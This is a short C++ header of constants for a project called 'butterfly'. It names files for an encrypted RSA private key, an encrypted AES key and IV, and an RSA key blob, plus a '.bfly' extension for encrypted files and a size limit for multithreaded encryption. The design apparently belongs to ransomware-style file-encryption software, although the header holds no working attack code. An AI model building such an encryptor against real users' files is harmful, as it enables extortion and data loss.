
#ifndef BUTTERFLY_PARAMS_H
#define BUTTERFLY_PARAMS_H

namespace butterfly
{

enum RSAKEY_TYPE { CPRIVATE_RSA, AESKEY };

// Filename CPrivateRSA.bin
const std::string ENC_CPRIVATERSA_FILENAME   = "CPrivateRSA.bin";   // encrypted CPrivateRSA pem file

// Filename AES.bin
const std::string ENC_AESKEY_FILENAME        = "AES.bin";           // encrypted AESKey+AESIV (32Bytes+16Bytes)

// Filename RSA.bin
const std::string RSA_EKIV_FILENAME          = "RSA.bin";           // unencrypted RSAEK + RSAIV (1721/256Bytes + 16Bytes)

// Encrypted Butterfly File Extension
const std::string ENC_BFLY_FILE_ENDING       = ".bfly";             // encrypted file extension

// If a file is greater than this value, new enc thread is created
const double MAX_FILE_SIZE = 100.0;                                 // in MByte

} // namespace butterfly

#endif //BUTTERFLY_PARAMS_H
